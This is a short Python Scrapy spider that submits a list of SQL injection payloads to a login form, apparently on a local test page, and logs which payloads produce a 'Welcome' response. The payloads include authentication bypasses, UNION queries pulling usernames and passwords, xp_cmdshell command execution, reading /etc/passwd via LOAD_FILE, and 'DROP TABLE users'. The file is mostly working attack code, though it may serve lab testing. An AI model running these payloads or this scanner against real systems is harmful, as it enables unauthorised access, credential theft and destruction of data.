import scrapy

class SqliTestSpider(scrapy.Spider):
    name = "sqli_test"
    start_urls = [
        'http://localhost:5001/sqli',  # The URL of your local SQL injection page
    ]

    def parse(self, response):
        # Log that we reached the page
        self.logger.info(f"Reached start URL: {response.url}")

        payloads = [
            "' OR '1'='1' --",
            "' OR 1=1 --",
            "' OR '1'='1' /*",
            "' OR '' = '",
            "'; EXEC xp_cmdshell('dir') --",
            "' UNION SELECT NULL, NULL, NULL --",
            "' UNION SELECT username, password FROM users --",
            "' AND 1=CONVERT(int, (SELECT @@version)) --",
            "' OR SLEEP(5) --",
            "'; DROP TABLE users; --",
            "' UNION SELECT LOAD_FILE('/etc/passwd') --",
            "admin' --",
            "admin' #",
            "admin'/*",
            "') OR ('1'='1",
            "') OR 1=1 --",
            "random' OR 'x'='x",
            "' OR EXISTS(SELECT * FROM users) --"
        ]


        for payload in payloads:
            self.logger.info(f"Submitting payload: {payload}")
            yield scrapy.FormRequest(
                url='http://localhost:5001/sqli',
                formdata={'username': payload, 'password': payload},
                callback=self.after_submission,
                meta={'payload': payload}
            )

    def after_submission(self, response):
        payload = response.meta['payload']
        
        if "Welcome" in response.text:
            self.logger.info(f"✅ Successful SQL Injection with payload: {payload}")
        else:
            self.logger.info(f"❌ SQL Injection failed with payload: {payload}")

        # Also log HTTP response status
        self.logger.info(f"HTTP Response Code: {response.status}")
